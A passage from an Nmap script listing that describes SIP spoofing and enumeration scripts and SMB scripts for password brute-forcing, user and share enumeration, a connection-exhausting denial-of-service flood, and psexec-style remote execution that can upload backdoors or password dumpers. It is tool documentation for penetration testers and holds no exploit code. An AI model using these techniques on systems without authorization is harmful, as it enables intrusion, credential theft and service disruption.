<description>Spoofs a call to a SIP phone and detects the action taken by the target (busy, declined, hung up, etc.)&#xa;&#xa;This works by sending a fake sip invite request to the target phone and checking&#xa;the responses. A response with status code 180 means that the phone is ringing.&#xa;The script waits for the next responses until timeout is reached or a special&#xa;response is received.  Special responses include:  Busy (486), Decline (603),&#xa;Timeout (408) or Hang up (200).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\sip-enum-users.nse">
<categories><category>auth</category><category>intrusive</category></categories>
<description>Enumerates a SIP server&apos;s valid extensions (users).&#xa;&#xa;The script works by sending REGISTER SIP requests to the server with the&#xa;specified extension and checking for the response status code in order&#xa;to know if an extension is valid. If a response status code is 401 or&#xa;407, it means that the extension is valid and requires authentication. If the&#xa;response status code is 200, it means that the extension exists and doesn&apos;t&#xa;require any authentication while a 403 response status code means that&#xa;extension exists but access is forbidden. To skip false positives, the script&#xa;begins by sending a REGISTER request for a random extension and checking for&#xa;response status code.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\sip-methods.nse">
<categories><category>default</category><category>safe</category><category>discovery</category></categories>
<description>Enumerates a SIP Server&apos;s allowed methods (INVITE, OPTIONS, SUBSCRIBE, etc.)&#xa;&#xa;The script works by sending an OPTION request to the server and checking for&#xa;the value of the Allow header in the response.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\skypev2-version.nse">
<categories><category>version</category></categories>
<description>Detects the Skype version 2 service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Attempts to guess username/password combinations over SMB, storing discovered combinations&#xa;for use in other scripts. Every attempt will be made to get a valid list of users and to&#xa;verify each username before actually using them. When a username is discovered, besides&#xa;being printed, it is also saved in the Nmap registry so other Nmap scripts can use it. That&#xa;means that if you&apos;re going to run &lt;code&gt;smb-brute.nse&lt;/code&gt;, you should run other &lt;code&gt;smb&lt;/code&gt; scripts you want.&#xa;This checks passwords in a case-insensitive way, determining case after a password is found,&#xa;for Windows versions before Vista.&#xa;&#xa;This script is specifically targeted towards security auditors or penetration testers.&#xa;One example of its use, suggested by Brandon Enright, was hooking up &lt;code&gt;smb-brute.nse&lt;/code&gt; to the&#xa;database of usernames and passwords used by the Conficker worm (the password list can be&#xa;found at http://www.skullsecurity.org/wiki/index.php/Passwords, among other places.&#xa;Then, the network is scanned and all systems that would be infected by Conficker are&#xa;discovered.&#xa;&#xa;From the penetration tester perspective its use is pretty obvious. By discovering weak passwords&#xa;on SMB, a protocol that&apos;s well suited for bruteforcing, access to a system can be gained.&#xa;Further, passwords discovered against Windows with SMB might also be used on Linux or MySQL&#xa;or custom Web applications. Discovering a password greatly beneficial for a pen-tester.&#xa;&#xa;This script uses a lot of little tricks that I (Ron Bowes) describe in detail in a blog&#xa;posting, http://www.skullsecurity.org/blog/?p=164. The tricks will be summarized here, but&#xa;that blog is the best place to learn more.&#xa;&#xa;Usernames and passwords are initially taken from the unpwdb library. If possible, the usernames&#xa;are verified as existing by taking advantage of Windows&apos; odd behaviour with invalid username&#xa;and invalid password responses. As soon as it is able, this script will download a full list&#xa;of usernames from the server and replace the unpw usernames with those. This enables the&#xa;script to restrict itself to actual accounts only.&#xa;&#xa;When an account is discovered, it&apos;s saved in the &lt;code&gt;smb&lt;/code&gt; module (which uses the Nmap&#xa;registry). If an account is already saved, the account&apos;s privileges are checked; accounts&#xa;with administrator privileges are kept over accounts without. The specific method for checking&#xa;is by calling &lt;code&gt;GetShareInfo(&quot;IPC$&quot;)&lt;/code&gt;, which requires administrative privileges. Once this script&#xa;is finished (all other smb scripts depend on it, it&apos;ll run first), other scripts will use the saved account&#xa;to perform their checks.&#xa;&#xa;The blank password is always tried first, followed by &quot;special passwords&quot; (such as the username&#xa;and the username reversed). Once those are exhausted, the unpwdb password list is used.&#xa;&#xa;One major goal of this script is to avoid account lockouts. This is done in a few ways. First,&#xa;when a lockout is detected, unless you user specifically overrides it with the &lt;code&gt;smblockout&lt;/code&gt;&#xa;argument, the scan stops. Second, all usernames are checked with the most common passwords first,&#xa;so with not-too-strict lockouts (10 invalid attempts), the 10 most common passwords will still&#xa;be tried. Third, one account, called the canary, &quot;goes out ahead&quot;; that is, three invalid&#xa;attempts are made (by default) to ensure that it&apos;s locked out before others are.&#xa;&#xa;In addition to active accounts, this script will identify valid passwords for accounts that&#xa;are disabled, guest-equivalent, and require password changes. Although these accounts can&apos;t&#xa;be used, it&apos;s good to know that the password is valid. In other cases, it&apos;s impossible to&#xa;tell a valid password (if an account is locked out, for example). These are displayed, too.&#xa;Certain accounts, such as guest or some guest-equivalent, will permit any password. This&#xa;is also detected. When possible, the SMB protocol is used to its fullest to get maximum&#xa;information.&#xa;&#xa;When possible, checks are done using a case-insensitive password, then proper case is&#xa;determined with a fairly efficient bruteforce. For example, if the actual password is&#xa;&quot;PassWord&quot;, then &quot;password&quot; will work and &quot;PassWord&quot; will be found afterwards (on the&#xa;14th attempt out of a possible 256 attempts, with the current algorithm).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-double-pulsar-backdoor.nse">
<categories><category>vuln</category><category>safe</category><category>malware</category></categories>
<description>Checks if the target machine is running the Double Pulsar SMB backdoor.&#xa;&#xa;Based on the python detection script by Luke Jennings of Countercept.&#xa;https://github.com/countercept/doublepulsar-detection-script&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-enum-domains.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Attempts to enumerate domains on a system, along with their policies. This generally requires&#xa;credentials, except against Windows 2000. In addition to the actual domain, the &quot;Builtin&quot;&#xa;domain is generally displayed. Windows returns this in the list of domains, but its policies&#xa;don&apos;t appear to be used anywhere.&#xa;&#xa;Much of the information provided is useful to a penetration tester, because it tells the&#xa;tester what types of policies to expect. For example, if passwords have a minimum length of 8,&#xa;the tester can trim his database to match; if the minimum length is 14, the tester will&#xa;probably start looking for sticky notes on people&apos;s monitors.&#xa;&#xa;Another useful piece of information is the password lockouts. A penetration tester often wants&#xa;to know whether or not there&apos;s a risk of negatively impacting a network, and this will&#xa;indicate it. The SID is displayed, which may be useful in other tools; the users are listed,&#xa;which uses different functions than &lt;code&gt;smb-enum-users.nse&lt;/code&gt; (though likely won&apos;t&#xa;get different results), and the date and time the domain was created may give some insight into&#xa;its history.&#xa;&#xa;After the initial &lt;code&gt;bind&lt;/code&gt; to SAMR, the sequence of calls is:&#xa;* &lt;code&gt;Connect4&lt;/code&gt;: get a connect_handle&#xa;* &lt;code&gt;EnumDomains&lt;/code&gt;: get a list of the domains (stop here if you just want the names).&#xa;* &lt;code&gt;QueryDomain&lt;/code&gt;: get the SID for the domain.&#xa;* &lt;code&gt;OpenDomain&lt;/code&gt;: get a handle for each domain.&#xa;* &lt;code&gt;QueryDomainInfo2&lt;/code&gt;: get the domain information.&#xa;* &lt;code&gt;QueryDomainUsers&lt;/code&gt;: get a list of the users in the domain.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-enum-groups.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Obtains a list of groups from the remote Windows system, as well as a list of the group&apos;s users.&#xa;This works similarly to &lt;code&gt;enum.exe&lt;/code&gt; with the &lt;code&gt;/G&lt;/code&gt; switch.&#xa;&#xa;The following MSRPC functions in SAMR are used to find a list of groups and the RIDs of their users. Keep&#xa;in mind that MSRPC refers to groups as &quot;Aliases&quot;.&#xa;&#xa;* &lt;code&gt;Bind&lt;/code&gt;: bind to the SAMR service.&#xa;* &lt;code&gt;Connect4&lt;/code&gt;: get a connect_handle.&#xa;* &lt;code&gt;EnumDomains&lt;/code&gt;: get a list of the domains.&#xa;* &lt;code&gt;LookupDomain&lt;/code&gt;: get the RID of the domains.&#xa;* &lt;code&gt;OpenDomain&lt;/code&gt;: get a handle for each domain.&#xa;* &lt;code&gt;EnumDomainAliases&lt;/code&gt;: get the list of groups in the domain.&#xa;* &lt;code&gt;OpenAlias&lt;/code&gt;: get a handle to each group.&#xa;* &lt;code&gt;GetMembersInAlias&lt;/code&gt;: get the RIDs of the members in the groups.&#xa;* &lt;code&gt;Close&lt;/code&gt;: close the alias handle.&#xa;* &lt;code&gt;Close&lt;/code&gt;: close the domain handle.&#xa;* &lt;code&gt;Close&lt;/code&gt;: close the connect handle.&#xa;&#xa;Once the RIDs have been termined, the&#xa;* &lt;code&gt;Bind&lt;/code&gt;: bind to the LSA service.&#xa;* &lt;code&gt;OpenPolicy2&lt;/code&gt;: get a policy handle.&#xa;* &lt;code&gt;LookupSids2&lt;/code&gt;: convert SIDs to usernames.&#xa;&#xa;I (Ron Bowes) originally looked into the possibility of using the SAMR function &lt;code&gt;LookupRids2&lt;/code&gt;&#xa;to convert RIDs to usernames, but the function seemed to return a fault no matter what I tried. Since&#xa;enum.exe also switches to LSA to convert RIDs to usernames, I figured they had the same issue and I do&#xa;the same thing.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-enum-processes.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Pulls a list of processes from the remote server over SMB. This will determine&#xa;all running processes, their process IDs, and their parent processes. It is done&#xa;by querying the remote registry service, which is disabled by default on Vista;&#xa;on all other Windows versions, it requires Administrator privileges.&#xa;&#xa;Since this requires administrator privileges, it isn&apos;t especially useful for a&#xa;penetration tester, since they can effectively do the same thing with metasploit&#xa;or other tools. It does, however, provide for a quick way to get process lists&#xa;for a bunch of systems at the same time.&#xa;&#xa;WARNING: I have experienced crashes in &lt;code&gt;regsvc.exe&lt;/code&gt; while making registry calls&#xa;against a fully patched Windows 2000 system; I&apos;ve fixed the issue that caused&#xa;it, but there&apos;s no guarantee that it (or a similar vulnerability in the same code) won&apos;t&#xa;show up again. Since the process automatically restarts, it doesn&apos;t negatively&#xa;impact the system, besides showing a message box to the user.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-enum-services.nse">
<categories><category>discovery</category><category>intrusive</category><category>safe</category></categories>
<description>Retrieves the list of services running on a remote Windows system.&#xa;Each service attribute contains service name, display name and service status of&#xa;each service.&#xa;&#xa;Note: Modern Windows systems requires a privileged domain account in order to&#xa;list the services.&#xa;&#xa;References:&#xa;* https://technet.microsoft.com/en-us/library/bb490995.aspx&#xa;* https://en.wikipedia.org/wiki/Windows_service&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-enum-sessions.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Enumerates the users logged into a system either locally or through an SMB share. The local users&#xa;can be logged on either physically on the machine, or through a terminal services session.&#xa;Connections to a SMB share are, for example, people connected to fileshares or making RPC calls.&#xa;Nmap&apos;s connection will also show up, and is generally identified by the one that connected &quot;0&#xa;seconds ago&quot;.&#xa;&#xa;From the perspective of a penetration tester, the SMB Sessions is probably the most useful&#xa;part of this program, especially because it doesn&apos;t require a high level of access. On, for&#xa;example, a file server, there might be a dozen or more users connected at the same time. Based&#xa;on the usernames, it might tell the tester what types of files are stored on the share.&#xa;&#xa;Since the IP they&apos;re connected from and the account is revealed, the information here can also&#xa;provide extra targets to test, as well as a username that&apos;s likely valid on that target. Additionally,&#xa;since a strong username to ip correlation is given, it can be a boost to a social engineering&#xa;attack.&#xa;&#xa;Enumerating the logged in users is done by reading the remote registry (and therefore won&apos;t&#xa;work against Vista, which disables it by default). Keys stored under &lt;code&gt;HKEY_USERS&lt;/code&gt; are&#xa;SIDs that represent the connected users, and those SIDs can be converted to proper names by using&#xa;the &lt;code&gt;lsar.LsaLookupSids&lt;/code&gt; function. Doing this requires any access higher than&#xa;anonymous; guests, users, or administrators are all able to perform this request on Windows 2000,&#xa;XP, 2003, and Vista.&#xa;&#xa;Enumerating SMB connections is done using the &lt;code&gt;srvsvc.netsessenum&lt;/code&gt; function, which&#xa;returns the usernames that are logged in, when they logged in, and how long they&apos;ve been idle&#xa;for. The level of access required for this varies between Windows versions, but in Windows&#xa;2000 anybody (including the anonymous account) can access this, and in Windows 2003 a user&#xa;or administrator account is required.&#xa;&#xa;I learned the idea and technique for this from Sysinternals&apos; tool, &lt;code&gt;PsLoggedOn.exe&lt;/code&gt;. I (Ron&#xa;Bowes) use similar function calls to what they use (although I didn&apos;t use their source),&#xa;so thanks go out to them. Thanks also to Matt Gardenghi, for requesting this script.&#xa;&#xa;WARNING: I have experienced crashes in regsvc.exe while making registry calls&#xa;against a fully patched Windows 2000 system; I&apos;ve fixed the issue that caused it,&#xa;but there&apos;s no guarantee that it (or a similar vuln in the same code) won&apos;t show&#xa;up again. Since the process automatically restarts, it doesn&apos;t negatively impact&#xa;the system, besides showing a message box to the user.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-enum-shares.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Attempts to list shares using the &lt;code&gt;srvsvc.NetShareEnumAll&lt;/code&gt; MSRPC function and&#xa;retrieve more information about them using &lt;code&gt;srvsvc.NetShareGetInfo&lt;/code&gt;. If access&#xa;to those functions is denied, a list of common share names are checked.&#xa;&#xa;Finding open shares is useful to a penetration tester because there may be private files&#xa;shared, or, if it&apos;s writable, it could be a good place to drop a Trojan or to infect a file&#xa;that&apos;s already there. Knowing where the share is could make those kinds of tests more useful,&#xa;except that determining where the share is requires administrative privileges already.&#xa;&#xa;Running &lt;code&gt;NetShareEnumAll&lt;/code&gt; will work anonymously against Windows 2000, and&#xa;requires a user-level account on any other Windows version. Calling &lt;code&gt;NetShareGetInfo&lt;/code&gt;&#xa;requires an administrator account on all versions of Windows up to 2003, as well as Windows Vista&#xa;and Windows 7, if UAC is turned down.&#xa;&#xa;Even if &lt;code&gt;NetShareEnumAll&lt;/code&gt; is restricted, attempting to connect to a share will always&#xa;reveal its existence. So, if &lt;code&gt;NetShareEnumAll&lt;/code&gt; fails, a pre-generated list of shares,&#xa;based on a large test network, are used. If any of those succeed, they are recorded.&#xa;&#xa;After a list of shares is found, the script attempts to connect to each of them anonymously,&#xa;which divides them into &quot;anonymous&quot;, for shares that the NULL user can connect to, or &quot;restricted&quot;,&#xa;for shares that require a user account.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-enum-users.nse">
<categories><category>auth</category><category>intrusive</category></categories>
<description>Attempts to enumerate the users on a remote Windows system, with as much&#xa;information as possible, through two different techniques (both over MSRPC,&#xa;which uses port 445 or 139; see &lt;code&gt;smb.lua&lt;/code&gt;). The goal of this script&#xa;is to discover all user accounts that exist on a remote system. This can be&#xa;helpful for administration, by seeing who has an account on a server, or for&#xa;penetration testing or network footprinting, by determining which accounts&#xa;exist on a system.&#xa;&#xa;A penetration tester who is examining servers may wish to determine the&#xa;purpose of a server. By getting a list of who has access to it, the tester&#xa;might get a better idea (if financial people have accounts, it probably&#xa;relates to financial information). Additionally, knowing which accounts&#xa;exist on a system (or on multiple systems) allows the pen-tester to build a&#xa;dictionary of possible usernames for bruteforces, such as a SMB bruteforce&#xa;or a Telnet bruteforce. These accounts may be helpful for other purposes,&#xa;such as using the accounts in Web applications on this or other servers.&#xa;&#xa;From a pen-testers perspective, retrieving the list of users on any&#xa;given server creates endless possibilities.&#xa;&#xa;Users are enumerated in two different ways:  using SAMR enumeration or&#xa;LSA bruteforcing. By default, both are used, but they have specific&#xa;advantages and disadvantages. Using both is a great default, but in certain&#xa;circumstances it may be best to give preference to one.&#xa;&#xa;Advantages of using SAMR enumeration:&#xa;* Stealthier (requires one packet/user account, whereas LSA uses at least 10 packets while SAMR uses half that; additionally, LSA makes a lot of noise in the Windows event log (LSA enumeration is the only script I (Ron Bowes) have been called on by the administrator of a box I was testing against).&#xa;* More information is returned (more than just the username).&#xa;* Every account will be found, since they&apos;re being enumerated with a function that&apos;s designed to enumerate users.&#xa;&#xa;Advantages of using LSA bruteforcing:&#xa;* More accounts are returned (system accounts, groups, and aliases are returned, not just users).&#xa;* Requires a lower-level account to run on Windows XP and higher (a &apos;guest&apos; account can be used, whereas SAMR enumeration requires a &apos;user&apos; account; especially useful when only guest access is allowed, or when an account has a blank password (which effectively gives it guest access)).&#xa;&#xa;SAMR enumeration is done with the  &lt;code&gt;QueryDisplayInfo&lt;/code&gt; function.&#xa;If this succeeds, it will return a detailed list of users, along with descriptions,&#xa;types, and full names. This can be done anonymously against Windows 2000, and&#xa;with a user-level account on other Windows versions (but not with a guest-level account).&#xa;&#xa;To perform this test, the following functions are used:&#xa;* &lt;code&gt;Bind&lt;/code&gt;: bind to the SAMR service.&#xa;* &lt;code&gt;Connect4&lt;/code&gt;: get a connect_handle.&#xa;* &lt;code&gt;EnumDomains&lt;/code&gt;: get a list of the domains.&#xa;* &lt;code&gt;QueryDomain&lt;/code&gt;: get the sid for the domain.&#xa;* &lt;code&gt;OpenDomain&lt;/code&gt;: get a handle for each domain.&#xa;* &lt;code&gt;QueryDisplayInfo&lt;/code&gt;: get the list of users in the domain.&#xa;* &lt;code&gt;Close&lt;/code&gt;: Close the domain handle.&#xa;* &lt;code&gt;Close&lt;/code&gt;: Close the connect handle.&#xa;The advantage of this technique is that a lot of details are returned, including&#xa;the full name and description; the disadvantage is that it requires a user-level&#xa;account on every system except for Windows 2000. Additionally, it only pulls actual&#xa;user accounts, not groups or aliases.&#xa;&#xa;Regardless of whether this succeeds, a second technique is used to pull&#xa;user accounts, called LSA bruteforcing. LSA bruteforcing can be done anonymously&#xa;against Windows 2000, and requires a guest account or better on other systems.&#xa;It has the advantage of running with less permission, and will also find more&#xa;account types (i.e., groups, aliases, etc.). The disadvantages is that it returns&#xa;less information, and that, because it&apos;s a brute-force guess, it&apos;s possible to miss&#xa;accounts. It&apos;s also extremely noisy.&#xa;&#xa;This isn&apos;t a brute-force technique in the common sense, however: it&apos;s a brute-forcing of users&apos;&#xa;RIDs. A user&apos;s RID is a value (generally 500, 501, or 1000+) that uniquely identifies&#xa;a user on a domain or system. An LSA function is exposed which lets us convert the RID&#xa;(say, 1000) to the username (say, &quot;Ron&quot;). So, the technique will essentially try&#xa;converting 1000 to a name, then 1001, 1002, etc., until we think we&apos;re done.&#xa;&#xa;To do this, the script breaks users into groups of RIDs based on the &lt;code&gt;LSA_GROUPSIZE&lt;/code&gt;&#xa;constant. All members of this group are checked simultaneously, and the responses recorded.&#xa;When a series of empty groups are found (&lt;code&gt;LSA_MINEMPTY&lt;/code&gt; groups, specifically),&#xa;the scan ends. As long as you are getting a few groups with active accounts, the scan will&#xa;continue.&#xa;&#xa;Before attempting this conversion, the SID of the server has to be determined.&#xa;The SID is determined by doing the reverse operation; that is, by converting a name into&#xa;its RID. The name is determined by looking up any name present on the system.&#xa;We try:&#xa;* The computer name and domain name, returned in &lt;code&gt;SMB_COM_NEGOTIATE&lt;/code&gt;;&#xa;* An nbstat query to get the server name and the user currently logged in; and&#xa;* Some common names: &quot;administrator&quot;, &quot;guest&quot;, and &quot;test&quot;.&#xa;&#xa;In theory, the computer name should be sufficient for this to always work, and&#xa;it has so far has in my tests, but I included the rest of the names for good measure. It&#xa;doesn&apos;t hurt to add more.&#xa;&#xa;The names and details from both of these techniques are merged and displayed.&#xa;If the output is verbose, then extra details are shown. The output is ordered alphabetically.&#xa;&#xa;Credit goes out to the &lt;code&gt;enum.exe&lt;/code&gt;, &lt;code&gt;sid2user.exe&lt;/code&gt;, and&#xa;&lt;code&gt;user2sid.exe&lt;/code&gt; programs for pioneering some of the techniques used&#xa;in this script.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-flood.nse">
<categories><category>intrusive</category><category>dos</category></categories>
<description>Exhausts a remote SMB server&apos;s connection limit by by opening as many&#xa;connections as we can.  Most implementations of SMB have a hard global&#xa;limit of 11 connections for user accounts and 10 connections for&#xa;anonymous. Once that limit is reached, further connections are&#xa;denied. This script exploits that limit by taking up all the&#xa;connections and holding them.&#xa;&#xa;This works better with a valid user account, because Windows reserves&#xa;one slot for valid users. So, no matter how many anonymous connections&#xa;are taking up spaces, a single valid user can still log in.&#xa;&#xa;This is *not* recommended as a general purpose script, because a) it&#xa;is designed to harm the server and has no useful output, and b) it&#xa;never ends (until timeout).&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-ls.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Attempts to retrieve useful information about files shared on SMB volumes.&#xa;The output is intended to resemble the output of the UNIX &lt;code&gt;ls&lt;/code&gt; command.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-mbenum.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Queries information managed by the Windows Master Browser.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-os-discovery.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to determine the operating system, computer name, domain, workgroup, and current&#xa;time over the SMB protocol (ports 445 or 139).&#xa;This is done by starting a session with the anonymous&#xa;account (or with a proper user account, if one is given; it likely doesn&apos;t make&#xa;a difference); in response to a session starting, the server will send back all this&#xa;information.&#xa;&#xa;The following fields may be included in the output, depending on the&#xa;circumstances (e.g. the workgroup name is mutually exclusive with domain and forest&#xa;names) and the information available:&#xa;* OS&#xa;* Computer name&#xa;* Domain name&#xa;* Forest name&#xa;* FQDN&#xa;* NetBIOS computer name&#xa;* NetBIOS domain name&#xa;* Workgroup&#xa;* System time&#xa;&#xa;Some systems, like Samba, will blank out their name (and only send their domain).&#xa;Other systems (like embedded printers) will simply leave out the information. Other&#xa;systems will blank out various pieces (some will send back 0 for the current&#xa;time, for example).&#xa;&#xa;If this script is used in conjunction with version detection it can augment the&#xa;standard nmap version detection information with data that this script has discovered.&#xa;&#xa;Retrieving the name and operating system of a server is a vital step in targeting&#xa;an attack against it, and this script makes that retrieval easy. Additionally, if&#xa;a penetration tester is choosing between multiple targets, the time can help identify&#xa;servers that are being poorly maintained (for more information/random thoughts on&#xa;using the time, see http://www.skullsecurity.org/blog/?p=76.&#xa;&#xa;Although the standard &lt;code&gt;smb*&lt;/code&gt; script arguments can be used,&#xa;they likely won&apos;t change the outcome in any meaningful way. However, &lt;code&gt;smbnoguest&lt;/code&gt;&#xa;will speed up the script on targets that do not allow guest access.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-print-text.nse">
<categories><category>intrusive</category></categories>
<description>Attempts to print text on a shared printer by calling Print Spooler Service RPC functions.&#xa;&#xa;In order to use the script, at least one printer needs to be shared&#xa;over SMB. If no printer is specified, script tries to enumerate existing&#xa;ones by calling LANMAN API which might not be always available.&#xa;LANMAN is available by default on Windows XP, but not on Vista or Windows 7&#xa;for example. In that case, you need to specify printer share name manually&#xa;using &lt;code&gt;printer&lt;/code&gt; script argument. You can find out available shares&#xa;by using smb-enum-shares script.&#xa;&#xa;Later versions of Windows require valid credentials by default&#xa;which you can specify trough smb library arguments &lt;code&gt;smbuser&lt;/code&gt; and&#xa;&lt;code&gt;smbpassword&lt;/code&gt; or other options.&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-protocols.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Attempts to list the supported protocols and dialects of a SMB server.&#xa;&#xa;The script attempts to initiate a connection using the dialects:&#xa;* NT LM 0.12 (SMBv1)&#xa;* 2.0.2      (SMBv2)&#xa;* 2.1        (SMBv2)&#xa;* 3.0        (SMBv3)&#xa;* 3.0.2      (SMBv3)&#xa;* 3.1.1      (SMBv3)&#xa;&#xa;Additionally if SMBv1 is found enabled, it will mark it as insecure. This&#xa;script is the successor to the (removed) smbv2-enabled script.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\smb-psexec.nse">
<categories><category>intrusive</category></categories>
<description>Implements remote process execution similar to the Sysinternals&apos; psexec&#xa;tool, allowing a user to run a series of programs on a remote machine and&#xa;read the output. This is great for gathering information about servers,&#xa;running the same tool on a range of system, or even installing a backdoor on&#xa;a collection of computers.&#xa;&#xa;This script can run commands present on the remote machine, such as ping or&#xa;tracert, or it can upload a program and run it, such as pwdump6 or a&#xa;backdoor. Additionally, it can read the program&apos;s stdout/stderr and return&#xa;it to the user (works well with ping, pwdump6, etc), or it can read a file&#xa;that the process generated (fgdump, for example, generates a file), or it&#xa;can just start the process and let it run headless (a backdoor might run&#xa;like this).&#xa;&#xa;To use this, a configuration file should be created and edited. Several&#xa;configuration files are included that you can customize, or you can write&#xa;your own. This config file is placed in &lt;code&gt;nselib/data/psexec&lt;/code&gt; (if&#xa;you aren&apos;t sure where that is, search your system for&#xa;&lt;code&gt;default.lua&lt;/code&gt;), then is passed to Nmap as a script argument (for&#xa;example, myconfig.lua would be passed as&#xa;&lt;code&gt;-&#45;script-args=config=myconfig&lt;/code&gt;.&#xa;&#xa;The configuration file consists mainly of a module list. Each module is&#xa;defined by a lua table, and contains fields for the name of the program, the&#xa;executable and arguments for the program, and a score of other options.&#xa;Modules also have an &apos;upload&apos; field, which determines whether or not the&#xa;module is to be uploaded. Here is a simple example of how to run &lt;code&gt;net&#xa;localgroup administrators&lt;/code&gt;, which returns a list of users in the&#xa;&quot;administrators&quot; group (take a look at the &lt;code&gt;examples.lua&lt;/code&gt;&#xa;configuration file for these examples):&#xa;&#xa;&lt;code&gt;&#xa;  mod = {}&#xa;  mod.upload           = false&#xa;  mod.name             = &quot;Example 1: Membership of &apos;administrators&apos;&quot;&#xa;  mod.program          = &quot;net.exe&quot;&#xa;  mod.args             = &quot;localgroup administrators&quot;&#xa;  table.insert(modules, mod)&#xa;&lt;/code&gt;&#xa;&#xa;&lt;code&gt;mod.upload&lt;/code&gt; is &lt;code&gt;false&lt;/code&gt;, meaning the program should&#xa;already be present on the remote system (since &apos;net.exe&apos; is on every version&#xa;of Windows, this should be the case). &lt;code&gt;mod.name&lt;/code&gt; defines the name&#xa;that the program will have in the output. &lt;code&gt;mod.program&lt;/code&gt; and&#xa;&lt;code&gt;mod.args&lt;/code&gt; obviously define which program is going to be run. The&#xa;output for this script is this:&#xa;&#xa;&lt;code&gt;&#xa;  |  Example 1: Membership of &apos;administrators&apos;&#xa;  |  | Alias name     administrators&#xa;  |  | Comment        Administrators have complete and unrestricted access to the computer/domain&#xa;  |  |&#xa;  |  | Members&#xa;  |  |&#xa;  |  | -&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;&#xa;  |  | Administrator&#xa;  |  | ron&#xa;  |  | test&#xa;  |  | The command completed successfully.&#xa;  |  |&#xa;  |  |_&#xa;&lt;/code&gt;&#xa;&#xa;That works, but it&apos;s really ugly. In general, we can use&#xa;&lt;code&gt;mod.find&lt;/code&gt;, &lt;code&gt;mod.replace&lt;/code&gt;, &lt;code&gt;mod.remove&lt;/code&gt;,&#xa;and &lt;code&gt;mod.noblank&lt;/code&gt; to clean up the output. For this example, we&apos;re&#xa;going to use &lt;code&gt;mod.remove&lt;/code&gt; to remove a lot of the useless lines,&#xa;and &lt;code&gt;mod.noblank&lt;/code&gt; to get rid of the blank lines that we don&apos;t&#xa;want:&#xa;&#xa;&lt;code&gt;&#xa;  mod = {}&#xa;  mod.upload           = false&#xa;  mod.name             = &quot;Example 2: Membership of &apos;administrators&apos;, cleaned&quot;&#xa;  mod.program          = &quot;net.exe&quot;&#xa;  mod.args             = &quot;localgroup administrators&quot;&#xa;  mod.remove           = {&quot;The command completed&quot;, &quot;%-%-%-%-%-%-%-%-%-%-%-&quot;, &quot;Members&quot;, &quot;Alias name&quot;, &quot;Comment&quot;}&#xa;  mod.noblank          = true&#xa;  table.insert(modules, mod)&#xa;&lt;/code&gt;&#xa;&#xa;We can see that the output is now much cleaner:&#xa;&#xa;&lt;code&gt;&#xa;|  Example 2: Membership of &apos;administrators&apos;, cleaned&#xa;|  | Administrator&#xa;|  | ron&#xa;|  |_test&#xa;&lt;/code&gt;&#xa;&#xa;For our next command, we&apos;re going to run Windows&apos; ipconfig.exe, which&#xa;outputs a significant amount of unnecessary information, and what we do want&#xa;isn&apos;t formatted very nicely. All we want is the IP address and MAC address,&#xa;and we get it using &lt;code&gt;mod.find&lt;/code&gt; and &lt;code&gt;mod.replace&lt;/code&gt;:&#xa;&#xa;&lt;code&gt;&#xa;  mod = {}&#xa;  mod.upload           = false&#xa;  mod.name             = &quot;Example 3: IP Address and MAC Address&quot;&#xa;  mod.program          = &quot;ipconfig.exe&quot;&#xa;  mod.args             = &quot;/all&quot;&#xa;  mod.maxtime          = 1&#xa;  mod.find             = {&quot;IP Address&quot;, &quot;Physical Address&quot;, &quot;Ethernet adapter&quot;}&#xa;  mod.replace          = {{&quot;%. &quot;, &quot;&quot;}, {&quot;-&quot;, &quot;:&quot;}, {&quot;Physical Address&quot;, &quot;MAC Address&quot;}}&#xa;  table.insert(modules, mod)&#xa;&lt;/code&gt;&#xa;&#xa;This module searches for lines that contain &quot;IP Address&quot;, &quot;Physical&#xa;Address&quot;, or &quot;Ethernet adapter&quot;.  In these lines, a &quot;. &quot; is replaced with&#xa;nothing, a &quot;-&quot; is replaced with a colon, and the term &quot;Physical Address&quot; is&#xa;replaced with &quot;MAC Address&quot; (arguably unnecessary). Run ipconfig /all&#xa;yourself to see what we start with, but here&apos;s the final output:&#xa;&#xa;&lt;code&gt;&#xa;|  Example 3: IP Address and MAC Address&#xa;|  | Ethernet adapter Local Area Connection:&#xa;|  |    